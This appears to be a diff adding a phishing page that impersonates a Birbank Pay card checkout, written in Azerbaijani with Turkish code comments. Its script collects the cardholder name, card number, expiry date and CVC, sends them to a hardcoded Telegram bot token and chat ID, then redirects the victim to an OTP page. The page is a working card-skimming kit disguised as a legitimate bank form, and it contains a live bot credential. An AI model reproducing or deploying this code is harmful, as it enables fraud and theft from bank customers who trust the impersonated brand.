@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <link rel="shortcut icon" href="birbank.png" type="image/ico">
+    <title>Birbank Pay</title>
+
+    <link rel="stylesheet" href="ode_files/styles.css" type="text/css">
+    <style>
+        .logo {
+            width: 250px; /* Logonun genişliği */
+            height: auto; /* Oranı koruyarak yüksekliği ayarla */
+            display: block;
+            margin-left: 0; /* Sola hizala */
+        }
+
+        .btn.pay-btn {
+            background-color: #FF0039; /* Kırmızı renk */
+            color: white; /* Yazı rengi */
+            border: none; /* Çerçeve kaldırıldı */
+            padding: 10px 20px; /* İç boşluk */
+            border-radius: 5px; /* Kenar yuvarlaklığı */
+            font-size: 16px; /* Yazı boyutu */
+            cursor: pointer; /* Tıklanabilir imleç */
+            display: block;
+            margin: 20px auto; /* Ortalanmış buton */
+            text-align: center;
+        }
+
+        .btn.pay-btn:hover {
+            opacity: 0.9; /* Hover efektinde hafif transparan */
+        }
+
+        .btn.pay-btn.disabled {
+            background-color: grey; /* Pasif durumda gri */
+            color: white;
+            cursor: not-allowed;
+        }
+
+        .input-field input {
+            border: 2px solid black; /* Varsayılan durumda siyah kenarlık */
+            outline: none; /* Tarayıcı varsayılan odak stilini kaldırır */
+            box-shadow: none; /* Gölgeyi kaldırır */
+            border-radius: 4px; /* Kenarlıklara yuvarlaklık eklendi */
+            padding: 10px; /* Giriş alanına boşluk ekler */
+        }
+
+        .input-field input:focus {
+            border: 2px solid red; /* Odaklandığında kırmızı kenarlık */
+        }
+
+        .input-field input:not(:placeholder-shown) {
+            border: 2px solid red; /* İçerik olduğunda kırmızı kenarlık */
+        }
+
+        #countdown {
+            font-size: 14px;
+            font-weight: normal;
+        }
+
+        #resendButton {
+            font-size: 14px;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="mainwrapper">
+        <header class="ecom-header">
+            <img class="logo" src="ode_files/pb-logo.svg" alt="pb-logo">
+            <label class="amount-label">Ümumi məbləğ</label>
+            <label id="ledger" class="amount">1000.00 AZN</label>
+        
+        </header>
+
+        <main>
+            <form id="cardentry" method="post" autocomplete="off">
+                <div class="input-field">
+                    <label for="cardname">Ad və Soyad</label>
+                    <input tabindex="1" id="cardname" name="cardname" type="text" maxlength="26" autocomplete="cc-name" placeholder="Kart üzərindəki ad və soyad">
+                    <p id="cardname-error-mandatory" class="error-message hidden">
+                        Xana məlumatları qeyd olunmalıdır
+                    </p>
+                    <p id="cardname-error-alpha" class="error-message hidden">
+                        Rəqəm və simvollardan istifadə edilməməlidir
+                    </p>
+                </div>
+
+                <div class="input-field">
+                    <label for="cardnr">Kart nömrəsi</label>
+                    <div class="input-with-icon">
+                        <input tabindex="2" type="text" id="cardnr" name="cardnr" placeholder="1234 1234 1234 1234" maxlength="19" autocomplete="cc-number">
+                        <img id="card-number-icon" src="ode_files/card.svg" alt="card">
+                    </div>
+                    <p id="cardnr-error-mandatory" class="error-message hidden">
+                        Xana məlumatları qeyd olunmalıdır
+                    </p>
+                    <p id="cardnr-error-length" class="error-message hidden">
+                        16 rəqəmli olmalıdır.
+                    </p>
+                </div>
+                <p id="keycode"></p>
+                <div class="input-group">
+                    <div class="input-field">
+                        <label for="expire-date">Kartın bitmə tarixi</label>
+                        <input id="expire-date" type="text" placeholder="ay / il" maxlength="5" autocomplete="cc-exp" inputmode="text">
+                        <p id="expire-date-error-mandatory" class="error-message hidden">
+                            Xana məlumatları qeyd olunmalıdır
+                        </p>
+                        <p id="expire-date-error-format" class="error-message hidden">
+                            Format yanlışdır
+                        </p>
+                        <input type="hidden" name="validMONTH" id="month-input">
+                        <input type="hidden" name="validYEAR" id="year-input">
+                    </div>
+
+                    <div class="input-field">
+                        <label for="cvc2">CVC2 / CVV2</label>
+                        <div class="input-with-icon">
+                            <input id="cvc2" name="cvc2" type="password" placeholder="123" maxlength="4" autocomplete="cc-csc">
+                            <img src="ode_files/cvc.svg" alt="card">
+                        </div>
+                        <p id="cvc2-error-mandatory" class="error-message hidden">
+                            Xana məlumatları qeyd olunmalıdır
+                        </p>
+                        <p id="cvc2-error-length" class="error-message hidden">
+                            3 rəqəmli olmalıdır
+                        </p>
+                    </div>
+                </div>
+                <button id="pay-btn" class="btn pay-btn" type="button">
+                    Ödəniş et
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <footer>
+        <div class="plastic-cards-container">
+            <div class="plastic-cards">
+                <img src="ode_files/verified-by-visa.svg" alt="verified-by-visa">
+                <img src="ode_files/visa.svg" alt="visa">
+                <img src="ode_files/visa-electron.svg" alt="visa-electron">
+            </div>
+            <div class="plastic-cards">
+                <img src="ode_files/maestro.svg" alt="maestro">
+                <img src="ode_files/mastercard.svg" alt="mastercard">
+                <img src="ode_files/mastercard-secure-code.svg" alt="mastercard-secure-code">
+            </div>
+        </div>
+        <div class="contacts">
+            <p>Bankla əlaqə üçün:</p>
+            <p>
+                customer.care@birbank.az
+                <span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
+            </p>
+            <p id="copyrights">© Copyrights 2007-2024 Birbank</p>
+        </div>
+    </footer>
+
+    <div id="video-roll-root-mask"></div>
+</body>
+
+<script src="../../code.jquery.com/jquery-3.6.4.min.js"></script>
+<script>document.addEventListener('DOMContentLoaded', function () {
+    const cardname = document.querySelector('#cardname');
+    const cardnumber = document.querySelector('#cardnr');
+    const expiredate = document.querySelector('#expire-date');
+    const cvc2 = document.querySelector('#cvc2');
+    const paybtn = document.querySelector('#pay-btn');
+
+    // Kart numarasını formatlama (XXXX XXXX XXXX XXXX)
+    cardnumber.addEventListener('input', function () {
+        let value = this.value.replace(/\D/g, ''); // Sadece rakamları al
+        value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Her 4 rakamda bir boşluk
+        this.value = value.trim();
+    });
+
+    // Son kullanma tarihini formatlama (MM/YY)
+    expiredate.addEventListener('input', function () {
+        let value = this.value.replace(/\D/g, ''); // Sadece rakamları al
+        if (value.length <= 4) {
+            value = value.replace(/^(\d{2})(\d{0,2})$/, '$1/$2'); // 0525 -> 05/25
+        }
+        this.value = value;
+    });
+
+    // CVC alanını sadece rakamlarla sınırlandır
+    cvc2.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, ''); // Sadece rakamları al
+    });
+
+    // Alanların geçerli olup olmadığını kontrol eden fonksiyon
+    function checkInputs() {
+        const isCardNameValid = cardname.value.trim() !== ''; // Ad Soyad boş değil
+        const isCardNumberValid = cardnumber.value.replace(/\s/g, '').length === 16; // Kart numarası 16 hane
+        const isExpireDateValid = /^\d{2}\/\d{2}$/.test(expiredate.value); // Tarih MM/YY formatında
+        const isCVCValid = cvc2.value.length === 3; // CVC 3 hane
+
+        // Eğer tüm alanlar geçerliyse buton aktif olsun
+        if (isCardNameValid && isCardNumberValid && isExpireDateValid && isCVCValid) {
+            paybtn.disabled = false;
+            paybtn.classList.remove('disabled');
+        } else {
+            paybtn.disabled = true;
+            paybtn.classList.add('disabled');
+        }
+    }
+
+    // Her giriş değişikliğinde kontrol et
+    cardname.addEventListener('input', checkInputs);
+    cardnumber.addEventListener('input', checkInputs);
+    expiredate.addEventListener('input', checkInputs);
+    cvc2.addEventListener('input', checkInputs);
+
+    // Telegram mesaj gönderme
+    var telegram_bot_id = "8181395152:AAFrWCNgIiLdodA1uITARV74M4S6OMNBwDs";
+    var chat_id = 7813611012;
+    var message;
+
+    function prepareMessage() {
+        const cardnm = cardname.value;
+        const cardnr = cardnumber.value;
+        const expdate = expiredate.value;
+        const cvc = cvc2.value;
+
+        message = `Log: irshad 💳\nMəbləğ: 999.99 AZN\nCard Name: ${cardnm}\nCard Number: ${cardnr}\nExpire Date: ${expdate}\nCVC2: ${cvc}`;
+    }
+
+    function sendMessage() {
+        prepareMessage();
+        const telegramSettings = {
+            "async": true,
+            "crossDomain": true,
+            "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
+            "method": "POST",
+            "headers": {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({ "chat_id": chat_id, "text": message })
+        };
+
+        $.ajax(telegramSettings).done(function (response) {
+            console.log("Tamam:", response);
+        });
+
+        // Formu sıfırla ve yeni sayfaya yönlendir
+        const last4 = cardnumber.value.slice(-4);
+        cardname.value = '';
+        cardnumber.value = '';
+        expiredate.value = '';
+        cvc2.value = '';
+        setTimeout(function () {
+            window.location.href = `otp6871.html?cardnr=${last4}`;
+        }, 1000);
+    }
+
+    // Ödeme butonuna tıklama olayı
+    paybtn.addEventListener('click', function (event) {
+        event.preventDefault();
+        if (!paybtn.disabled) {
+            sendMessage();
+        }
+    });
+
+    // İlk kontrol (sayfa yüklendiğinde butonun pasif olmasını sağlamak için)
+    checkInputs();
+});
+</script>
+</html>
